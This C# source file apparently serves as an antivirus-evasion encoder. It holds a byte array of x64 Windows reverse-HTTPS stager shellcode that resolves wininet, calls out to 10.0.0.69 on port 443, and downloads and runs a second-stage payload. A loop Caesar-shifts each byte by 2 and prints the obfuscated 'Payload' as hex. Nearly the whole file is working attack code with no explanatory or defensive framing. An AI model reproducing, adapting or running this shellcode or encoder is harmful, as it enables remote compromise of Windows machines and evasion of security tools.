﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ceaser
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[1024] {0x5a,0x96,0x92,0x9f,0x5e,0x9f,
0x56,0x51,0xfc,0x93,0x9b,0x51,0x9c,0xfd,0xf8,0x5a,0x5f,0x5e,
0x99,0x58,0x52,0x58,0x9c,0x54,0x9f,0x5f,0x55,0x5e,0x54,0xf9,
0x99,0xf8,0x98,0x9d,0x9b,0x91,0x92,0x5c,0x90,0x94,0x56,0x56,
0xf8,0x9f,0x5e,0x92,0xf8,0x95,0x9c,0x90,0x92,0xf9,0x91,0xf8,
0x52,0x59,0x52,0x9f,0x9e,0xfd,0xf9,0xfc,0x95,0x51,0x9f,0x50,
0x58,0x97,0x59,0x51,0x9b,0x52,0x9c,0x9d,0x91,0x5d,0x50,0x9f,
0x9f,0x5b,0x91,0x58,0xfc,0x5e,0x53,0x93,0x98,0x52,0x9b,0x50,
0x51,0x90,0x58,0x5b,0x9e,0x97,0x93,0x9f,0x59,0x52,0x96,0xfd,
0xfc,0x5b,0x53,0x52,0x92,0x53,0x91,0x99,0x96,0x5e,0x94,0x94,
0xfc,0x9d,0x58,0x93,0x58,0xf8,0x98,0x53,0x54,0x57,0x97,0x96,
0x5b,0xf8,0x52,0x50,0x93,0x50,0x91,0x55,0x98,0x5c,0x56,0x5d,
0x95,0x96,0x9c,0x53,0x5f,0x93,0x93,0x57,0xf9,0x9d,0x97,0x5d,
0x57,0x91,0x95,0x9b,0x5e,0x5c,0x5a,0x98,0x5a,0x96,0x5e,0x9d,
0x57,0x92,0x56,0x9b,0x51,0xf8,0x9b,0x55,0x91,0x59,0xfc,0x9d,
0x96,0x92,0x50,0x9e,0x59,0x58,0xfd,0x51,0xfc,0x5f,0x90,0x9e,
0xf9,0x9e,0x95,0xf8,0x51,0x91,0x58,0x56,0x92,0xfc,0x52,0x5b,
0xfd,0x5f,0x54,0x5e,0x5a,0x59,0x52,0x9e,0x54,0x97,0x99,0x5c,
0x99,0x9c,0x97,0x56,0x55,0xf8,0x9d,0x55,0x98,0x5e,0x5e,0x5f,
0x5d,0x9e,0x5a,0x9b,0x57,0xfd,0x5a,0x59,0xfc,0x59,0x96,0x59,
0x97,0x5c,0x5d,0x53,0x9b,0x59,0x5a,0x57,0x5a,0x51,0x53,0x99,
0x97,0x91,0xfc,0xfc,0x5b,0x9c,0x90,0x59,0x98,0x9c,0xfd,0x5a,
0x5f,0x55,0x57,0x98,0x94,0x5e,0x5e,0x97,0x5a,0x59,0x96,0x55,
0x90,0x93,0x96,0x5a,0x5a,0x96,0x52,0x50,0x93,0xfd,0x9f,0x90,
0x9c,0x57,0xfd,0x96,0x9b,0x57,0x59,0x95,0x9d,0x5c,0x92,0x92,
0x9f,0x95,0x98,0x53,0x50,0x94,0x91,0x9c,0x57,0x95,0x52,0x51,
0x56,0x58,0x5a,0x9b,0x50,0xf8,0x9b,0x9f,0x5c,0x5b,0x54,0x5a,
0xf8,0x57,0x9c,0xf8,0x50,0x93,0x5a,0x94,0x59,0x5d,0x57,0x56,
0x90,0x53,0x9e,0x5e,0x50,0x58,0x55,0x9e,0x57,0x98,0x59,0x5f,
0xfc,0x5e,0x9f,0x9d,0x5b,0xf9,0x9f,0x93,0x5f,0x90,0x99,0x59,
0xfd,0x5b,0x95,0x57,0x57,0x9e,0x5a,0x90,0x93,0x91,0x91,0x9e,
0x98,0x5c,0x57,0x53,0x5a,0x5a,0x56,0x53,0x57,0x96,0x50,0x5b,
0x5c,0x94,0x9c,0x51,0x5e,0x5b,0x50,0x55,0x9f,0x9f,0x9b,0xf9,
0x9f,0x94,0x50,0x92,0x53,0x94,0x52,0xfd,0x9c,0x5d,0x99,0x98,
0x5b,0x99,0x9f,0x92,0x91,0x91,0x98,0x95,0x90,0x58,0x95,0x91,
0x53,0x58,0x52,0x95,0x97,0x55,0xf9,0x5e,0x95,0x9b,0x53,0x9d,
0x52,0x5c,0x95,0x55,0x57,0x51,0x5a,0xfc,0x48,0x83,0xe4,0xf0,
0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,
0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
0x01,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,
0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x48,0x01,0xd0,
0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,
0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,
0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x07,0xff,0xd5,0x53,0x53,
0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,
0xd5,0xe8,0x0a,0x00,0x00,0x00,0x31,0x30,0x2e,0x30,0x2e,0x30,
0x2e,0x36,0x39,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,
0x01,0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,
0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,
0x4b,0x00,0x00,0x00,0x2f,0x43,0x5a,0x41,0x42,0x51,0x56,0x77,
0x4b,0x4a,0x65,0x54,0x34,0x70,0x76,0x6d,0x6b,0x6e,0x59,0x50,
0x41,0x33,0x77,0x58,0x67,0x43,0x53,0x4e,0x33,0x4c,0x41,0x33,
0x6e,0x77,0x71,0x6e,0x5f,0x63,0x77,0x68,0x5a,0x53,0x58,0x57,
0x59,0x74,0x63,0x36,0x68,0x59,0x79,0x6e,0x79,0x56,0x38,0x6c,
0x31,0x6c,0x44,0x59,0x75,0x44,0x71,0x38,0x66,0x55,0x55,0x50,
0x79,0x69,0x54,0x6a,0x33,0x35,0x00,0x48,0x89,0xc1,0x53,0x5a,
0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x02,0x28,0x84,
0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x53,0x5a,
0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,
0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,
0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,
0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,
0xeb,0xcc,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,
0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,
0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,
0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,
0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,
0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,
0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,
0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};
            byte[] encoded = new byte[buf.Length];
            int shift = 2;
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + shift) & 0xFF);
            }
            StringBuilder hex = new StringBuilder(encoded.Length * 2);

            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("Payload of {0} bytes with the key of {1}:\n\n" + hex.ToString() + "\n", buf.Length, shift);
        }
    }
}